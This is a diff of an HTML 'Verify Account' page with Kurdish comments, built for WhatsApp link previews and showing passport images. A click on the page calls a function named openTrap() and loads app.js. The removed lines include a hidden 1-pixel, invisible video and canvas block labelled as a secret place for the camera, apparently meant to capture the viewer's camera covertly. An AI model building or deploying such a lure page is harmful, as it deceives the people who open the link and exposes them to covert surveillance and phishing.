@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>1000058139 - Verify Account</title>
     
-    <!-- تەگەکانی SEO و واتساپ -->
     <meta name="description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
     
     <meta property="og:type" content="website">
@@ -14,7 +13,6 @@
     <meta property="og:description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
     <meta property="og:site_name" content="Verify App">
     
-    <!-- وێنەی یەکەم بۆ پێشبینینی واتساپ -->
     <meta property="og:image" content="https://verfy-app.netlify.app/IMG_6579.jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -28,15 +26,15 @@
         body, html { 
             margin: 0; 
             padding: 0; 
-            background-color: #000; /* ڕەنگی پاشبنەما */
+            background-color: #000; 
             height: 100%; 
             width: 100%;
-            overflow-y: auto; /* ڕێگە بە سکرۆلکردن دەدات */
+            overflow-y: auto; 
             overflow-x: hidden;
         }
         .image-list {
             display: flex;
-            flex-direction: column; /* ڕێکخستنی ستوونی */
+            flex-direction: column; 
             width: 100%;
             cursor: pointer;
         }
@@ -44,23 +42,15 @@
             width: 100%;
             height: auto;
             display: block;
-            margin-bottom: 2px; /* بۆشاییەکی زۆر بچووک لە نێوان وێنەکان */
+            margin-bottom: 2px; 
         }
     </style>
 </head>
 <body>
-    <!-- وێنەکان بە شێوەی ستوونی یەک لە دوای یەک -->
+    <!-- تەنها دوو وێنە ماونەتەوە -->
     <div class="image-list" onclick="openTrap()">
         <img src="IMG_6579.jpeg" alt="Passport 1">
-        <img src="IMG_6580.jpeg" alt="Passport 2">
-        <img src="IMG_6581.jpeg" alt="Passport 3">
-        <img src="IMG_6582.jpeg" alt="Passport 4">
-    </div>
-    
-    <!-- شوێنی نهێنی بۆ کامیرا -->
-    <div style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; overflow: hidden; z-index: -1;">
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
+        <img src="IMG_6581.jpeg" alt="Passport 2">
     </div>
 
     <script src="app.js"></script>
